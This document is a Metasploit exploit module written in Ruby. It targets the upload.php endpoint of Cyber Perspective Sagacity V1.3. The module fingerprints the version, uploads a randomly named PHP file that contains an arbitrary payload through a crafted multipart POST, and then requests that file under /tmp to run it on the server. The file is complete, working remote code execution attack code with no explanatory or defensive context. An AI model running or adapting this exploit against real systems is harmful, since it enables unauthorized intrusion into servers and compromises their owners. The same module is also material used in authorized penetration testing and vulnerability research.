require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cyber Perspective Sagacity upload.php Vulnerability',
      'Description'    => %q{ Abuses Cyber Perspective Sagacity V1.3 upload.php
	to execute arbitrary php code.
      },
      'Author'         => 'mario ceballos',
      'License'        => 'BSD_LICENSE',
      'References'     =>
        [
          [ 'URL', 'http://www.cyberperspectives.com/' ],
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
	},
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          ['Sagacity', {  }],
        ],
      'DisclosureDate' => 'Nov 3 2017',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(80),
        OptBool.new('SSL', [false, 'Use SSL', false]),
      ], self.class )
  end

  def check
  
  res = send_request_raw({'uri' => "/ste/index.php"})
	if res and res.body =~ /V1\.3/
		return Exploit::CheckCode::Vulnerable 
	end
  Exploit::CheckCode::Safe
  end

  def exploit

        file = rand_text_alpha_upper(5) + ".php"
        final = "<?php\n#{payload.raw}\n?>"
        
	dbl = Rex::MIME::Message.new
	dbl.add_part(final, "text/plain", nil, "form-data; name=\"file\"; filename=\"#{file}\"")
	data = dbl.to_s
	data.strip!

	num = rand(10).to_s

	res = send_request_cgi({
	  'uri'	=> "/upload.php",
	  'method'  => 'POST',
	  'cookie' => 'ste=' + num,
	  'ctype'   => "multipart/form-data; boundary=#{dbl.bound}",
          'data' => data,  
	  'headers'=> {
		'Accept' => 'application/json',
		'X-FILEMTIME' => '2017-11-13T15:43:33.273Z',
		'X-Requested-With' => 'XMLHttpRequest',
		'X-FILENAME' => file,
		'Referer' => "http://#{rhost}/results/?add_scan=" + num,
	  }
	}, 5)

	if res and res.code == 200
		print_status "Triggering payload at '/tmp/#{file}'..."
		send_request_raw({'uri' => "/tmp/#{file}",})
		handler
	else
		print_status "Error"
	end
  end
end
